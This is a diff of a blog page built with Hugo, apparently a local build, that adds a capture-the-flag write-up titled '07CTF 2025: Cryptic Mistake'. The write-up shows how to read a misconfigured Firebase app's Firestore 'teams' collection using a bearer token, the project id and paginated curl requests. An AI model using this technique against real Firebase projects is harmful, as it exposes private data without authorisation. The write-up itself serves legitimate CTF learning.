@@ -1,24 +1,29 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto">
 
-<head><meta charset="utf-8">
+<head><script src="/thecybersecurityblog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=thecybersecurityblog/livereload" data-no-instant defer></script><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="index, follow">
-<title>The Cyber Security Blog</title>
+<meta name="robots" content="noindex, nofollow">
+<title>07CTF 2025: Cryptic Mistake | The Cyber Security Blog</title>
 <meta name="keywords" content="">
-<meta name="description" content=" - The Cyber Security Blog">
+<meta name="description" content="Description I made a cryptic hunt platform, but seems like I messed up big time.
+https://v0-firebase-ctf-challenge.vercel.app/
+Category: web Difficulty: easy Author: bhavya_32 This is a firebase app, which means we could check for misconfigurations.
+Sign in with a google account and get the Bearer Token ID.
+Firebase uses firestore REST API. If misconfigured we may be able to read information with no priveleges. To access firestore we use
+https://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents/{collection} project_id is found at GET /__/firebase/init.">
 <meta name="author" content="">
-<link rel="canonical" href="https://dimparar.github.io/thecybersecurityblog/blog/">
+<link rel="canonical" href="http://localhost:1313/thecybersecurityblog/docs/07ctf_cryptic_mistake/">
 <link crossorigin="anonymous" href="/thecybersecurityblog/assets/css/stylesheet.e1d5379b61d412d35dcaf2371eec6bea8c023e307a0719dcab030767036d17f6.css" integrity="sha256-4dU3m2HUEtNdyvI3Huxr6owCPjB6BxncqwMHZwNtF/Y=" rel="preload stylesheet" as="style">
-<link rel="icon" href="https://dimparar.github.io/thecybersecurityblog/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="https://dimparar.github.io/thecybersecurityblog/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="https://dimparar.github.io/thecybersecurityblog/favicon-32x32.png">
-<link rel="apple-touch-icon" href="https://dimparar.github.io/thecybersecurityblog/apple-touch-icon.png">
-<link rel="mask-icon" href="https://dimparar.github.io/thecybersecurityblog/safari-pinned-tab.svg">
+<link rel="icon" href="http://localhost:1313/thecybersecurityblog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/thecybersecurityblog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/thecybersecurityblog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/thecybersecurityblog/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/thecybersecurityblog/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="https://dimparar.github.io/thecybersecurityblog/blog/">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/thecybersecurityblog/docs/07ctf_cryptic_mistake/">
 <noscript>
     <style>
         #theme-toggle,
@@ -55,61 +60,7 @@
         }
 
     </style>
-</noscript><meta property="og:title" content="" />
-<meta property="og:description" content="" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://dimparar.github.io/thecybersecurityblog/blog/" /><meta property="article:section" content="" />
-
-
-
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content=""/>
-<meta name="twitter:description" content=""/>
-
-
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BreadcrumbList",
-  "itemListElement": [
-    {
-      "@type": "ListItem",
-      "position":  1 ,
-      "name": "",
-      "item": "https://dimparar.github.io/thecybersecurityblog/blog/"
-    }
-  ]
-}
-</script>
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BlogPosting",
-  "headline": "",
-  "name": "",
-  "description": "",
-  "keywords": [
-    
-  ],
-  "articleBody": "",
-  "wordCount" : "0",
-  "inLanguage": "en",
-  "datePublished": "0001-01-01T00:00:00Z",
-  "dateModified": "0001-01-01T00:00:00Z",
-  "mainEntityOfPage": {
-    "@type": "WebPage",
-    "@id": "https://dimparar.github.io/thecybersecurityblog/blog/"
-  },
-  "publisher": {
-    "@type": "Organization",
-    "name": "The Cyber Security Blog",
-    "logo": {
-      "@type": "ImageObject",
-      "url": "https://dimparar.github.io/thecybersecurityblog/favicon.ico"
-    }
-  }
-}
-</script>
+</noscript>
 </head>
 
 <body class="" id="top">
@@ -133,13 +84,13 @@
     <nav class="nav">
         <div class="head-class">
             <div class="logo">
-                <a href="https://dimparar.github.io/thecybersecurityblog/" accesskey="h" title="The Cyber Security Blog (Alt + H)">The Cyber Security Blog</a>
+                <a href="http://localhost:1313/thecybersecurityblog/" accesskey="h" title="The Cyber Security Blog (Alt + H)">The Cyber Security Blog</a>
                 
             </div>
             <ul id="menu">
                 
                 <li>
-                    <a href="https://dimparar.github.io/thecybersecurityblog/" title="Home">
+                    <a href="http://localhost:1313/thecybersecurityblog/" title="Home">
                         <span>Home</span>
                     </a>
                 </li>
@@ -147,15 +98,15 @@
                     <li>|</li>
                 
                 <li>
-                    <a href="https://dimparar.github.io/thecybersecurityblog/blog/" title="Blog">
-                        <span class="active">Blog</span>
+                    <a href="http://localhost:1313/thecybersecurityblog/blog/" title="Blog">
+                        <span>Blog</span>
                     </a>
                 </li>
                 
                     <li>|</li>
                 
                 <li>
-                    <a href="https://dimparar.github.io/thecybersecurityblog/tags/" title="Tags">
+                    <a href="http://localhost:1313/thecybersecurityblog/tags/" title="Tags">
                         <span>Tags</span>
                     </a>
                 </li>
@@ -163,7 +114,7 @@
                     <li>|</li>
                 
                 <li>
-                    <a href="https://dimparar.github.io/thecybersecurityblog/about/" title="About">
+                    <a href="http://localhost:1313/thecybersecurityblog/about/" title="About">
                         <span>About</span>
                     </a>
                 </li>
@@ -179,12 +130,46 @@
   <header class="post-header">
     
     <h1 class="post-title entry-hint-parent">
-      
+      07CTF 2025: Cryptic Mistake
     </h1>
-    <div class="post-meta">
+    <div class="post-meta"><span title='2025-09-14 21:36:17 +0300 EEST'>14 Sep 2025</span>
 
 </div>
   </header> 
+  <div class="post-content"><hr>
+<h3 id="description">Description<a hidden class="anchor" aria-hidden="true" href="#description">#</a></h3>
+<p>I made a cryptic hunt platform, but seems like I messed up big time.</p>
+<p><a href="https://v0-firebase-ctf-challenge.vercel.app/">https://v0-firebase-ctf-challenge.vercel.app/</a></p>
+<p>Category: web <br>
+Difficulty: easy <br>
+Author: bhavya_32 <br></p>
+<hr>
+<p>This is a firebase app, which means we could check for misconfigurations.</p>
+<p><img loading="lazy" src="lab1.png" alt="alt"  />
+</p>
+<p>Sign in with a google account and get the Bearer Token ID.</p>
+<p><img loading="lazy" src="lab2.png" alt="alt"  />
+</p>
+<p>Firebase uses firestore REST API. If misconfigured we may be able to read information with no priveleges.
+To access firestore we use</p>
+<pre tabindex="0"><code class="language-url" data-lang="url">https://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents/{collection}
+</code></pre><p><code>project_id</code> is found at <code>GET /__/firebase/init.json</code> endpoint during sign in.</p>
+<p><img loading="lazy" src="lab3.png" alt="alt"  />
+</p>
+<p><code>collection</code> is <code>/teams</code> since there we have teams competing in the cryptic challenge.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#e6db74">&#39;https://firestore.googleapis.com/v1/projects/ctf-67ebf/databases/(default)/documents/teams&#39;</span> <span style="color:#ae81ff">\n</span>
+</span></span><span style="display:flex;"><span> -H <span style="color:#e6db74">&#39;Authorization: Bearer &lt;token_id_we_found&gt;&#39;</span> | grep 07CTF<span style="color:#f92672">{</span>
+</span></span></code></pre></div><p>We won&rsquo;t find the flag since not all the informations about <code>/teams</code> is shown in this page.</p>
+<p><img loading="lazy" src="lab4.png" alt="alt"  />
+</p>
+<p>We need to request the next page and the next until we find it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#e6db74">&#39;https://firestore.googleapis.com/v1/projects/ctf-67ebf/databases/(default)/documents/teams?pageToken=AFTOeJz1QyxZtnd5EdXR_W-GqrTcAd1Jvqvha1yJZsHt3r_vWCVvDwzndkVp-Na0qbJ7qXUtylR5jXjbZZtXe6Mnkerx6NbtlR982aZvjRfcnegQW5zXRC0ZTDLw8tIt&#39;</span> <span style="color:#ae81ff">\n</span>
+</span></span><span style="display:flex;"><span> -H <span style="color:#e6db74">&#39;Authorization: Bearer &lt;token_id_we_found&gt;&#39;</span> | grep 07CTF<span style="color:#f92672">{</span>
+</span></span></code></pre></div><p><img loading="lazy" src="lab5.png" alt="alt"  />
+</p>
+
+
+  </div>
 
   <footer class="post-footer">
     <ul class="post-tags">
@@ -194,7 +179,7 @@
     </main>
     
 <footer class="footer">
-    <span>&copy; 2026 <a href="https://dimparar.github.io/thecybersecurityblog/">The Cyber Security Blog</a></span>
+    <span>&copy; 2026 <a href="http://localhost:1313/thecybersecurityblog/">The Cyber Security Blog</a></span>
     <span>
         Powered by
         <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
